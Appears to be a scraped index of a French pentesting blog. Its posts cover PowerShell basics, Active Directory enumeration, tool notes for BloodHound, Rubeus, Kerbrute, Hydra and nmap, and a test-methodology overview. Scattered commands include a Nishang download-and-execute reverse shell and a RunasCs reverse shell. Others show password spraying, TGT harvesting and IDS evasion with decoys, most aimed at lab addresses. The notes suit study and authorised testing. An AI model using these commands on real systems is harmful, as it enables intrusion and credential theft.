Attack Lab (GitHub) ADSecurity Harmj0y\u0026rsquo;s Blog GOAD (GitHub) lab redteamleaders thehacker.recipes Cloud Security Labs Training cybersecurity classes on a variety of topics API Academy Hackerone CryptoHack Pentester Lab ","permalink":"https://nyobemichel.me/posts/learn/les-liens-essentiels/","summary":"annuaire complet de ressources en cybersécurité","title":"Les Liens Essentiels"},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---interne/","summary":"SMTP","title":"Enumeration AD - Interne"},{"content":"Introduction à PowerShell PowerShell est à la fois un langage de script puissant et un environnement en ligne de commande pour les systèmes Windows. Il est construit sur le framework .NET, ce qui lui permet de manipuler des objets complexes directement en ligne de commande.\nCommandes PowerShell de base Utilisation de Get-Help La commande Get-Help affiche des informations sur une cmdlet (commande PowerShell). Pour obtenir de l’aide sur une commande spécifique :\nGet-Help Nom-De-La-Commande Pour voir des exemples d\u0026rsquo;utilisation concrets :\nGet-Help Nom-De-La-Commande -Examples Utilisation de Get-Command Get-Command permet de lister toutes les cmdlets disponibles sur le système. Elle supporte également les filtres par motif :\nGet-Command Verb-* Get-Command *-Noun Par exemple :\nGet-Command New-* affichera toutes les cmdlets commençant par le verbe New.\nLe pipeline (|) Le pipeline (|) permet de transmettre la sortie d’une commande comme entrée à une autre. Contrairement aux autres shells (comme Bash), PowerShell passe des objets, et non du texte.\nExemple :\nGet-Command | Get-Member -MemberType Method Cela permet d’examiner les méthodes disponibles sur les objets retournés par Get-Command.\nCréation d’objets avec Select-Object Pour manipuler les résultats d’une commande et ne conserver que certaines propriétés :\nGet-ChildItem | Select-Object -Property Mode, Name Filtrage des objets avec Where-Object Pour filtrer les objets selon des critères précis :\nGet-Process | Where-Object -Property CPU -GT 100 Ou en notation script block :\nGet-Process | Where-Object { $_.CPU -gt 100 } Opérateurs courants : -Contains : contient exactement la valeur\n-EQ : égal\n-GT : supérieur\nTrier les objets avec Sort-Object Pour trier la sortie d’une commande :\nGet-Process | Sort-Object CPU Quelques commandes utiles Rechercher un fichier dans un dossier Get-ChildItem -Path \u0026#34;C:\\Users\\Michel\\Documents\u0026#34; -Recurse -Filter \u0026#34;rapport.docx\u0026#34; Obtenir le répertoire de travail actuel Get-Location Faire une requête HTTP Invoke-WebRequest -Uri \u0026#34;https://example.com\u0026#34; Énumération système Nombre d’utilisateurs locaux Get-LocalUser Informations détaillées sur tous les comptes utilisateur Get-WmiObject -Class Win32_UserAccount Obtenir l’adresse IP locale Get-NetIPAddress Voir les ports à l’écoute Get-NetTCPConnection | Where-Object { $_.State -eq \u0026#34;Listen\u0026#34; } Lister tous les processus en cours Get-Process Lister toutes les tâches planifiées Get-ScheduledTask Obtenir la liste de contrôle d’accès (ACL) Get-Acl -Path \u0026#34;C:\\chemin\\du\\dossier-ou-fichier\u0026#34; Pour aller plus loin https://learnxinyminutes.com/powershell/\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object\n","permalink":"https://nyobemichel.me/posts/articles/powershell/","summary":"PowerShell","title":"PowerShell"},{"content":"La reconnaissance est une étape clé dans toute campagne de Red Team ou d’audit de sécurité Active Directory. BloodHound est un outil puissant permettant de visualiser et d’analyser les relations d’un domaine Active Directory en utilisant la théorie des graphes.\nBloodHound : Présentation BloodHound est une application qui cartographie les relations entre les objets Active Directory (utilisateurs, groupes, ordinateurs, sessions, délégations, ACL, etc.) pour identifier des chemins d’attaque possibles, tels que les escalades de privilèges ou les mouvements latéraux.\nIl repose sur une base de données orientée graphe, Neo4j, et une interface graphique puissante qui permet d\u0026rsquo;exécuter des requêtes en langage Cypher pour analyser les chemins d\u0026rsquo;attaque.\nCollecte de données avec bloodhound-python L’outil classique SharpHound peut être remplacé par bloodhound-python, une alternative sans agent écrite en Python. Cela permet une collecte depuis une machine Linux ou directement via un shell Python dans certains cas de compromission.\nExemple de commande complète : sudo bloodhound-python -d \u0026lt;domain\u0026gt; -u \u0026lt;username\u0026gt;@\u0026lt;domain\u0026gt; -p \u0026lt;password\u0026gt; -c all -ns \u0026lt;domain_controller_ip\u0026gt; -v sudo bloodhound-python -d \u0026lt;domain\u0026gt; -c all --kerberos -ns \u0026lt;domaine_controller_ip\u0026gt; -v Une fois la collecte terminée, vous obtiendrez un ou plusieurs fichiers .json.gz à importer dans l’interface BloodHound.\nneo4j console http://localhost:7474/ Bloodhound\nhttps://bloodhound.readthedocs.io/en/latest/index.html https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/\n","permalink":"https://nyobemichel.me/posts/outils/bloodhound/","summary":"Bloodhound","title":"Bloodhound"},{"content":"est un couteau suisse d\u0026rsquo;escalade des privilèges Active Directory ./bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.42\u0026rdquo; -d \u0026ldquo;Administrator.htb\u0026rdquo; -u \u0026ldquo;olivia\u0026rdquo; -p \u0026ldquo;ichliebedich\u0026rdquo; set password \u0026ldquo;michael\u0026rdquo; \u0026ldquo;Password@123\u0026rdquo; https://github.com/CravateRouge/bloodyAD\n","permalink":"https://nyobemichel.me/posts/outils/bloodyad/","summary":"BloodyAD","title":"BloodyAD"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/chisel/","summary":"chisel","title":"chisel"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crackmapexec/","summary":"Crackmapexec","title":"Crackmapexec"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/curl/","summary":"Curl","title":"curl"},{"content":"Ce shell est le shell WinRM ultime pour le piratage/pentesting.\nWinRM (Windows Remote Management) est l\u0026rsquo;implémentation Microsoft du protocole WS-Management. Un protocole standard basé sur SOAP qui permet l\u0026rsquo;interopérabilité du matériel et des systèmes d\u0026rsquo;exploitation de différents fournisseurs. Microsoft l\u0026rsquo;a inclus dans ses systèmes d\u0026rsquo;exploitation afin de faciliter la vie des administrateurs système.\nCe programme peut être utilisé sur n\u0026rsquo;importe quel serveur Microsoft Windows avec cette fonctionnalité activée (généralement sur le port 5985), bien sûr uniquement si vous disposez des informations d\u0026rsquo;identification et des autorisations pour l\u0026rsquo;utiliser. Nous pouvons donc dire qu\u0026rsquo;il pourrait être utilisé dans une phase de piratage/pentesting post-exploitation. Le but de ce programme est de fournir des fonctionnalités agréables et faciles à utiliser pour le piratage. Il peut également être utilisé à des fins légitimes par les administrateurs système, mais la plupart de ses fonctionnalités sont axées sur le piratage/pentesting.\nIl est principalement basé sur la bibliothèque WinRM Ruby qui a changé sa façon de fonctionner depuis sa version 2.0. Désormais, au lieu d\u0026rsquo;utiliser le protocole WinRM, il utilise PSRP (Powershell Remoting Protocol) pour initialiser les pools d\u0026rsquo;espaces d\u0026rsquo;exécution ainsi que pour créer et traiter les pipelines.\nevil-winrm -i MonIP -u emily.oscars -p 'Passw'\nhttps://github.com/Hackplayers/evil-winrm\n","permalink":"https://nyobemichel.me/posts/outils/evil-winrm/","summary":"Evil-WinRM","title":"Evil-WinRM"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/ffuf/","summary":"ffuf","title":"ffuf"},{"content":"Peut être utilisé pour récupérer les utilisateurs du domaine qui ont défini « Ne pas exiger de pré-authentification Kerberos » et demander leurs TGT sans connaître leurs mots de passe. Il est alors possible de tenter de déchiffrer la clé de session envoyée avec le ticket pour récupérer le mot de passe de l\u0026rsquo;utilisateur.\nour vérifier si l\u0026rsquo;un de ces noms d\u0026rsquo;utilisateur est valide, nous utiliserons le script GetNPUsers.py.\n./GetNPUsers.py Domain_name/ -usersfile Usernames.txt -dc-ip 10.129.28.119 https://tools.thehacker.recipes/impacket/examples/getnpusers.py#commons\n","permalink":"https://nyobemichel.me/posts/outils/getnpusers.py/","summary":"GetNPUsers.py","title":"GetNPUsers.py"},{"content":"Gobuster est un outil polyvalent couramment utilisé pour le forçage de répertoires et de fichiers, mais il excelle également dans la découverte d\u0026rsquo;hôtes virtuels. Il envoie systématiquement des requêtes HTTP avec différents Hosten-têtes à une adresse IP cible, puis analyse les réponses pour identifier les hôtes virtuels valides.\nIl y a quelques éléments que vous devez préparer pour forcer Hostles en-têtes :\nTarget IdentificationTout d\u0026rsquo;abord, identifiez l\u0026rsquo;adresse IP du serveur web cible. Cela peut être réalisé par des recherches DNS ou d\u0026rsquo;autres techniques de reconnaissance. Wordlist PreparationPréparez une liste de mots contenant des noms d\u0026rsquo;hôtes virtuels potentiels. Vous pouvez utiliser une liste de mots précompilée, telle que SecLists, ou en créer une personnalisée en fonction du secteur d\u0026rsquo;activité de votre cible, des conventions de nommage ou d\u0026rsquo;autres informations pertinentes. gobuster dir -u http://10.10.11.72 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 gobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain ","permalink":"https://nyobemichel.me/posts/outils/gobuster/","summary":"Gobuster","title":"Gobuster"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/guacamole/","summary":"Guacamole","title":"Guacamole"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/hascat/","summary":"hascat","title":"hascat"},{"content":"hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v Pages de connexion HTTP\nhydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form \u0026#34;/login-get/index.php:username=^USER^\u0026amp;password=^PASS^:S=logout.php\u0026#34; -f SMTP\nhydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v https://github.com/digininja/CeWL ( generer une liste de mot passe )\n","permalink":"https://nyobemichel.me/posts/outils/hydra/","summary":"Hydra","title":"Hydra"},{"content":"Kerbrute est un outil d\u0026rsquo;énumération populaire utilisé pour forcer et énumérer les utilisateurs Active Directory valides en abusant de la pré-authentification Kerberos . https://github.com/ropnop/kerbrute/releases Rendre Kerbrute executable Enumeration des utilisateurs L\u0026rsquo;énumération des utilisateurs vous permet de savoir quels comptes d\u0026rsquo;utilisateurs se trouvent sur le domaine cible et quels comptes pourraient potentiellement être utilisés pour accéder au réseau.\n./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt ","permalink":"https://nyobemichel.me/posts/outils/kerbrute/","summary":"kerbrute","title":"kerbrute"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/linpeas/","summary":"linPeas","title":"linPeas"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/netexec/","summary":"NetExec","title":"NetExec"},{"content":"Nishang est un framework et un ensemble de scripts et de charges utiles permettant d\u0026rsquo;utiliser PowerShell pour la sécurité offensive, les tests d\u0026rsquo;intrusion et le red teaming. Nishang est utile à toutes les phases des tests d\u0026rsquo;intrusion.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;yourwebserver\u0026gt;/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] https://github.com/samratashok/nishang\n","permalink":"https://nyobemichel.me/posts/outils/nishang/","summary":"Nishang","title":"Nishang"},{"content":"nmap -sV -sC $IP -v -p- --min-rate 1000 -Pn -T4\nII existe au total 6 états différents pour un port scanné que nous pouvons obtenir : Open Closed Filtered unfiltered open | filtered Closed | filtered -Pn Désactive les requêtes ICMP Echo. \u0026lsquo; nmap 10.129.2.0/24 -F | grep \u0026quot;/tcp\u0026quot; | wc -l\u0026rsquo;\nLeurres Il existe des cas dans lesquels les administrateurs bloquent en principe des sous-réseaux spécifiques de différentes régions. Cela empêche tout accès au réseau cible. Un autre exemple est lorsque IPS doit nous bloquer. Pour cette raison, la méthode de balayage Decoy ( -D) est le bon choix. Avec cette méthode, Nmap génère diverses adresses IP aléatoires insérées dans l\u0026rsquo;en-tête IP pour masquer l\u0026rsquo;origine du paquet envoyé. Avec cette méthode, nous pouvons générer aléatoirement ( RND) un nombre spécifique (par exemple : 5) d\u0026rsquo;adresses IP séparées par deux points ( :). Notre véritable adresse IP est ensuite placée aléatoirement entre les adresses IP générées. Dans l\u0026rsquo;exemple suivant, notre véritable adresse IP est donc placée en deuxième position. Un autre point critique est que les leurres doivent être vivants. Sinon, le service sur la cible peut être inaccessible en raison des mécanismes de sécurité SYN-flooding.\nnmap $ip -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 -p 80 Analyse uniquement les ports spécifiés. -sS Exécute une analyse SYN sur les ports spécifiés. -Pn Désactive les requêtes ICMP Echo. -n Désactive la résolution DNS. --disable-arp-ping Désactive le ping ARP. --packet-trace Affiche tous les paquets envoyés et reçus. -D RND:5 Génère cinq adresses IP aléatoires qui indiquent l\u0026rsquo;IP source d\u0026rsquo;où provient la connexion. `nmap 10.129.96.164 -n -Pn -p 80 -O -S 10.10.15.130 -e tun0 -sV` Proxy DNS Par défaut, Nmapeffectue une résolution DNS inverse, sauf indication contraire, pour trouver des informations plus importantes sur notre cible. Ces requêtes DNS sont également transmises dans la plupart des cas, car le serveur Web donné est censé être trouvé et visité. Les requêtes DNS sont effectuées via le UDP port 53. Le TCP port 53était auparavant utilisé uniquement pour les \u0026quot; Zone transfers\u0026quot; entre les serveurs DNS ou le transfert de données supérieur à 512 octets. De plus en plus, cela change en raison des extensions IPv6 et DNSSEC. Ces changements entraînent de nombreuses requêtes DNS via le port TCP 53.\nCependant, cela Nmapnous donne toujours un moyen de spécifier nous-mêmes les serveurs DNS ( --dns-server \u0026lt;ns\u0026gt;,\u0026lt;ns\u0026gt;). Cette méthode pourrait nous être fondamentale si nous nous trouvons dans une zone démilitarisée ( DMZ). Les serveurs DNS de l\u0026rsquo;entreprise sont généralement plus fiables que ceux d\u0026rsquo;Internet. Ainsi, par exemple, nous pourrions les utiliser pour interagir avec les hôtes du réseau interne. Comme autre exemple, nous pouvons utiliser TCP port 53comme port source ( --source-port) pour nos analyses. Si l\u0026rsquo;administrateur utilise le pare-feu pour contrôler ce port et ne filtre pas correctement les IDS/IPS, nos paquets TCP seront approuvés et transmis.\nnmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 ncat -nv --source-port 53 10.129.150.182 50000 ","permalink":"https://nyobemichel.me/posts/outils/nmap/","summary":"Nmap","title":"Nmap"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/powerups/","summary":"PowerUps","title":"PowerUps"},{"content":"Get-DomainGPOLocalGroup Renvoie tous les objets de stratégie de groupe d\u0026rsquo;un domaine qui modifient les appartenances aux groupes locaux via les préférences « Groupes restreints » ou Stratégie de groupe. Renvoie également leurs mappages d\u0026rsquo;appartenance d\u0026rsquo;utilisateur, s\u0026rsquo;ils existent.\nGet-DomainObjectAcl Renvoie les ACL associées à un objet Active Directory spécifique. debut de l\u0026rsquo;attaque [[Abusing Active Directory ACLs]]\nGet-DomainObjectAcl -Identity \u0026#34;Domain Admins\u0026#34; -ResolveGUIDs - Verbose PowerView\nLe Domaine Courant Get-Netdomain Obtenir le SID du domain actuel Get-DomainSID Obtenir les COntrolleur de domaine Get-NetDomainController Obtenir la liste des utilisateurs du Domaine Get-NetUser Recherche les machines sur le domaine local où l\u0026rsquo;utilisateur actuel dispose d\u0026rsquo;un accès administrateur local. Find-LocalAdminAccess ","permalink":"https://nyobemichel.me/posts/outils/poweview/","summary":"Poweview","title":"Poweview"},{"content":"Il achemine tout le trafic provenant de n\u0026rsquo;importe quel outil de ligne de commande vers n\u0026rsquo;importe quel proxy que nous spécifions. il ajoute un proxy à n\u0026rsquo;importe quel outil de ligne de commande et constitue donc la méthode la plus simple pour acheminer le trafic Web des outils de ligne de commande via nos proxys Web. Pour utiliser proxychains, nous devons d\u0026rsquo;abord éditer /etc/proxychains.conf, commenter la dernière ligne et ajouter la ligne suivante à la fin de celle-ci :\n#socks4 127.0.0.1 9050 http 127.0.0.1 8080 Nous devrions également activer Quiet Mode pour la réduction du bruit en décommettant quiet_mode. Une fois cela fait, nous pouvons ajouter proxychains a n\u0026rsquo;importe quelle commande au début, et le trafic de cette commande sera acheminé via proxychains pour notre proxy web. Par exemple, essayons d\u0026rsquo;utiliser cURLl\u0026rsquo;un de nos exercices précédents :\nproxychains curl http://SERVER_IP:PORT ProxyChains-3.1 (http://proxychains.sf.net) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Ping IP\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; ...SNIP... \u0026lt;/html\u0026gt; https://github.com/haad/proxychains\n","permalink":"https://nyobemichel.me/posts/outils/proxychains/","summary":"proxychains","title":"Proxychains"},{"content":"Psexec est depuis des années la méthode de référence pour exécuter des processus à distance. Il permet à un administrateur d\u0026rsquo;exécuter des commandes à distance sur n\u0026rsquo;importe quel PC auquel il a accès.\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/psexec\npsexec.py /:@[[username-anarchyPublic]]\n","permalink":"https://nyobemichel.me/posts/outils/psexec-v2.43/","summary":"PsExec v2.43","title":"PsExec v2.43"},{"content":"LLMNR/NBT-NS/mDNS Poisoner\n","permalink":"https://nyobemichel.me/posts/outils/responder/","summary":"Responder","title":"Responder"},{"content":"Rubeus est un outil puissant pour attaquer Kerberos. Adapté de l\u0026rsquo;outil Kekeo, Rubeus propose une grande variété d\u0026rsquo;attaques et de fonctionnalités qui en font un outil très polyvalent pour attaquer Kerberos. Parmi ses nombreux outils et attaques, on peut citer le dépassement de hachage, les demandes et renouvellements de tickets, la gestion et l\u0026rsquo;extraction de tickets, la collecte, la transmission de tickets, l\u0026rsquo;AS-REP Roasting et le Kerberoasting. https://github.com/GhostPack/Rubeus\nRécolte de Tickets Rubeus.exe harvest /interval:30 Cette commande indique a Rubeux de recolter des TGT toutes les 30 secondes\nForce Brute / Pulverisation de mot de passe Cette attaque utilise un mot de passe Kerberos donné, le diffuse sur tous les utilisateurs détectés et génère un ticket .kirbi. Ce ticket est un TGT permettant d\u0026rsquo;obtenir des tickets de service auprès du KDC, ainsi que dans des attaques telles que l\u0026rsquo;attaque par transfert de ticket.\nRubeus.exe brute /password:Password1 /noticket Cela prendra un mot de passe donné et le « vaporisera » sur tous les utilisateurs trouvés, puis donnera le TGT .kirbi pour cet utilisateur\n","permalink":"https://nyobemichel.me/posts/outils/rubeus/","summary":"Rubeus","title":"Rubeus"},{"content":"./RunasCs.exe \u0026lsquo;M.schoolbus\u0026rsquo; \u0026lsquo;\u0026rsquo; powershell.exe -r \u0026lt;nc_IP\u0026gt;:\u0026lt;nc_Port\u0026gt;\n","permalink":"https://nyobemichel.me/posts/outils/runascs/","summary":"Runascs","title":"Runascs"},{"content":"Utiliser le fichier avec sqlmap :\nsqlmap -r requete.txt --dump --batch ","permalink":"https://nyobemichel.me/posts/outils/sqlmap/","summary":"SQLMAp","title":"SQLMAp"},{"content":"sshuttle : là où le proxy transparent rencontre le VPN et SSH Autant que je sache, sshuttle est le seul programme qui résout le cas courant suivant :\nVotre machine cliente (ou routeur) est Linux, FreeBSD, MacOS ou Windows. Vous avez accès à un réseau distant via ssh. Vous n’avez pas nécessairement accès administrateur sur le réseau distant. Le réseau distant n\u0026rsquo;a pas de VPN, ou seulement des protocoles VPN complexes (IPsec, PPTP, etc.). Ou peut-être êtes- vous l\u0026rsquo;administrateur et êtes-vous simplement frustré par l\u0026rsquo;état lamentable des outils VPN ? Vous ne souhaitez pas créer une redirection de port SSH pour chaque hôte/port du réseau distant. Vous détestez la redirection de port d\u0026rsquo;OpenSH parce qu\u0026rsquo;elle est aléatoirement lente et/ou stupide. Vous ne pouvez pas utiliser la fonctionnalité PermitTunnel d\u0026rsquo;OpenSH car elle est désactivée par défaut sur les serveurs OpenSH ; de plus, elle utilise TCP-over-TCP, ce qui a des performances terribles . ","permalink":"https://nyobemichel.me/posts/outils/sshuttle/","summary":"sshuttle","title":"sshuttle"},{"content":"Outils permettant de générer des noms d\u0026rsquo;utilisateur lors de tests de pénétration. _Les noms d\u0026rsquo;utilisateur représentent la moitié du problème de force brute des mots de passe.\n./username-anarchy --input-file Names.txt --select-format first.last,firstl,f.last,flast \u0026gt; Usernames.txt https://github.com/urbanadventurer/username-anarchy\n","permalink":"https://nyobemichel.me/posts/outils/username-anarchypublic/","summary":"username-anarchyPublic","title":"username-anarchyPublic"},{"content":" The version of WordPress installed and any associated vulnerabilities What plugins are installed and any associated vulnerabilities What themes are installed and any associated vulnerabilities Username enumeration Users with weak passwords via password brute forcing Backed up and publicly accessible wp-config.php files Database dumps that may be publicly accessible If error logs are exposed by plugins Media file enumeration Vulnerable Timthumb files If the WordPress readme file is present If WP-Cron is enabled If user registration is enabled Full Path Disclose Upload directory listing https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation ","permalink":"https://nyobemichel.me/posts/outils/wpscan/","summary":"WPscan","title":"WPscan"},{"content":"Le protocole FTP File Transfer Protocol( FTP) est l\u0026rsquo;un des plus anciens protocoles d\u0026rsquo;Internet. Il s\u0026rsquo;exécute au sein de la couche application de la pile de protocoles TCP/IP. Port 21\nQuelques Commande FTP\nget , Connect , put , quit , status , verbose\nft $IP Telecharger tous les fichiers disponibles\nwget -m --no-passive ftp://anonymous:anonymous@10.129.14.13 Trouver tous les scripts ftp Nmap\nfind / -type f -name ftp* 2\u0026gt;/dev/null | grep scripts TFTP Trivial File Transfer Protocol( TFTP) est plus simple que FTP et effectue des transferts de fichiers entre les processus client et serveur.\nhttps://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---ftp/","summary":"FTP","title":"Enumeration - FTP"},{"content":"Network File System( NFS) est un système de fichiers réseau développé par Sun Microsystems et dont l\u0026rsquo;objectif est le même que SMB.\nsudo nmap --script nfs* $ip$ -sV -p111,2049 Afficher les partage NFS Disponible\nshowmount -e 10.129.14.128 Montage du partage NFS\nmkdir target-NFS sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock cd target-NFS tree . ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---nfs/","summary":"NFS","title":"Enumeration - NFS"},{"content":"Definition Server Message Block ( SMB ) est un protocole de communication utilisé pour partager des fichiers, des imprimantes , des ports série et diverses communications entre les nœuds d\u0026rsquo;un réseau. port SMB 139 445\ntools smbclient\nL : list des partages sur la machines -U : user smbmap H : user crackmapexec smb 192.168.1.17 -u \u0026lsquo;raj\u0026rsquo; -p \u0026lsquo;123\u0026rsquo; \u0026ndash;shares \u0026ndash;users\nsudo nmap $ip$ -sV -sC -p139,445 rpcclient -U \u0026#34; \u0026#34; $ip Le rpcclientclient rpc propose de nombreuses requêtes permettant d\u0026rsquo;exécuter des fonctions spécifiques sur le serveur SMB pour obtenir des informations srvinfo , enumdomains, querydominfo, netshareenumall , netsharegetinfo , enumdomusers , queryuser Impacket - Samrrdump.py\nsmbmap -H $ip https://fr.wikipedia.org/wiki/Server_Message_Block\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smb/","summary":"SMB","title":"Enumeration - SMB"},{"content":"Le protocole Simple Mail Transfer Protocol( SMTP) permet d\u0026rsquo;envoyer des e-mails sur un réseau IP. Il peut être utilisé entre un client de messagerie et un serveur de courrier sortant, ou entre deux serveurs SMTP Par défaut, les serveurs SMTP acceptent les demandes de connexion sur le port 25 Pour interagir avec le serveur SMTP, nous pouvons utiliser l\u0026rsquo; telnetoutil pour initialiser une connexion TCP. L\u0026rsquo;initialisation de la session s\u0026rsquo;effectue avec la commande mentionnée ci-dessus, HELOou EHLO.\\\ntelnet IP_ADRESS 25 sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v smtp-user-enum smtp-user-enum -M VRFY -U /usr/share/seclists/Discovery/SNMP/snmp.txt -t 10.129.1.62 https://serversmtp.com/smtp-error/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---smtp/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"Outils\nCrackmapexec netexec smbclient rpcclient ldapsearch ldapsearch -x -H ldap://10.10.11.75 -D \u0026#39;name\u0026#39; -w \u0026#39;password\u0026#39; -b \u0026#34;dc=rustykey,dc=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; userPrincipalName ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---externe/","summary":"SMTP","title":"Enumeration - SMTP"},{"content":"1. Phase de pré-engagement La phase de pré-engagement est cruciale car elle pose les bases de l\u0026rsquo;ensemble du test de pénétration. Au cours de cette phase, les testeurs de pénétration travaillent en étroite collaboration avec le client pour comprendre ses besoins, ses préoccupations et ses objectifs spécifiques. Cela comprend la définition de la portée du test, l\u0026rsquo;établissement des échéanciers et la détermination des systèmes et des réseaux qui seront testés.\n2. Phase de collecte d\u0026rsquo;informations La collecte d\u0026rsquo;informations, également appelée reconnaissance ou collecte de renseignements, consiste à recueillir autant d\u0026rsquo;informations pertinentes que possible sur la cible. Cette phase peut être divisée en reconnaissance passive et active.\nPassive reconnaissanceimplique la collecte d\u0026rsquo;informations sans interaction directe avec les systèmes cibles. Cela peut inclure l\u0026rsquo;analyse de documents publics, la recherche sur les réseaux sociaux, l\u0026rsquo;examen des sites Web d\u0026rsquo;entreprises et l\u0026rsquo;utilisation d\u0026rsquo;outils OSINT (Open Source Intelligence). Cette approche ne laisse aucune trace et ne présente aucun risque pour l\u0026rsquo;infrastructure cible.\nActive reconnaissance, d\u0026rsquo;autre part, implique une interaction directe avec les systèmes cibles. Cela inclut des activités telles que l\u0026rsquo;analyse des ports, l\u0026rsquo;énumération des services et la capture de bannières. Bien que plus intrusive, cette méthode fournit des informations techniques détaillées sur l\u0026rsquo;environnement cible.\n3. Phase d’évaluation de la vulnérabilité Au cours de la phase d\u0026rsquo;évaluation des vulnérabilités, les testeurs de pénétration analyse les informations se sont réunis pour identifier les faiblesses potentielles en matière de sécurité. Cela implique l\u0026rsquo;utilisation de divers outils d\u0026rsquo;analyse automatisés et de techniques de test manuel pour découvrir les vulnérabilités des systèmes, des applications et de l\u0026rsquo;infrastructure réseau.\n4. Phase d\u0026rsquo;exploitation La phase d\u0026rsquo;exploitation est celle où les testeurs de pénétration tentent d\u0026rsquo;exploiter les vulnérabilités identifiées lors de la phase précédente. Cela permet de démontrer l\u0026rsquo;impact réel des faiblesses de sécurité et d\u0026rsquo;établir ce qu\u0026rsquo;un attaquant réel pourrait être en mesure d\u0026rsquo;accomplir.\nLors de l\u0026rsquo;exploitation, les testeurs doivent documenter soigneusement leurs activités et conserver un enregistrement précis des systèmes auxquels ils ont accédé. Il est essentiel de respecter les règles d\u0026rsquo;engagement convenues et d\u0026rsquo;éviter de causer des dommages aux systèmes de production. Les testeurs qualifiés créent souvent des chaînes d\u0026rsquo;attaque détaillées, montrant comment plusieurs vulnérabilités peuvent être combinées pour obtenir un accès plus approfondi.\n5. Phase post-exploitation Une fois l\u0026rsquo;accès initial obtenu, la phase de post-exploitation commence. Cette phase comprend des activités telles que l\u0026rsquo;escalade des privilèges, le mouvement latéral à travers le réseau, les tests d\u0026rsquo;exfiltration de données et le maintien de la persistance. L\u0026rsquo;objectif est de comprendre l\u0026rsquo;étendue complète de ce qu\u0026rsquo;un attaquant pourrait accomplir après avoir franchi les défenses initiales.\n6. Phase de mouvement latéral Le mouvement latéral consiste à naviguer dans le réseau après avoir obtenu un accès initial pour découvrir des systèmes, des ressources et des cibles potentielles supplémentaires. Cette phase se concentre sur l\u0026rsquo;identification et l\u0026rsquo;exploitation des relations de confiance entre les systèmes et sur l\u0026rsquo;élargissement de la présence du testeur de pénétration au sein du réseau.\n7. Preuve de concept La phase de preuve de concept consiste à créer un document detaille des preuves des preuves démontrant comment les vulnérabilités ont été exploitées. Cela comprend le développement de méthodes fiables et reproductibles pour reproduire les problèmes de sécurité identifiés, ce qui permet de valider les résultats et d\u0026rsquo;aider l\u0026rsquo;équipe technique du client à comprendre et à corriger les vulnérabilités.\n8. Phase post-engagement La phase de reporting est essentielle car elle permet de compiler les résultats techniques actionable information for the client. Un rapport de test de pénétration bien rédigé comprend généralement un résumé destiné à la direction, des résultats techniques détaillés destinés à l\u0026rsquo;équipe informatique et des recommandations claires pour la correction.\n9. Assistance à la remédiation et nouveaux tests Après la remise du rapport, de nombreuses missions de tests d\u0026rsquo;intrusion incluent une période de support de correction. Pendant cette période, les testeurs se rendent disponibles pour répondre aux questions sur leurs conclusions et fournir des conseils supplémentaires sur la mise en œuvre des correctifs.\n","permalink":"https://nyobemichel.me/posts/structure-test-penetration/","summary":"Un aperçu des phases lors d\u0026rsquo;un test d’intrusion","title":"structure test penetration"},{"content":"Avant de se lancer dans un test de pénétration, plusieurs crucial prerequisiteséléments doivent être établis pour garantir un engagement réussi, légal et professionnel. Ces éléments fondamentaux protègent à la fois le testeur de pénétration et le client tout en maximisant la valeur de l\u0026rsquo;évaluation. Ces éléments peuvent être, sans s\u0026rsquo;y limiter :\nAutorisation légale et documentation Définition et limites du champ d\u0026rsquo;application Collecte d\u0026rsquo;informations Canaux de communication et procédures d\u0026rsquo;urgence Préparation de l\u0026rsquo;environnement de test Considérations relatives à la sauvegarde et à la récupération Documentation et rapports Responsabilité professionnelle et assurance Confidentialité et traitement des données Autorisation légale et documentation La pierre angulaire de toute mission de test de pénétration est une autorisation légale appropriée. Cela commence par un accord écrit formel, souvent appelé Statement of Work( SoW) ou Master Services Agreement( MSA). Un MSA est souvent utilisé lorsqu\u0026rsquo;il existe une relation continue entre le client et le prestataire de services de test de pénétration. Il décrit les conditions générales de la relation commerciale\nMéthodologies de test de pénétration de base Penetration Testing Execution Standard La méthodologie la plus largement reconnue dans le domaine des 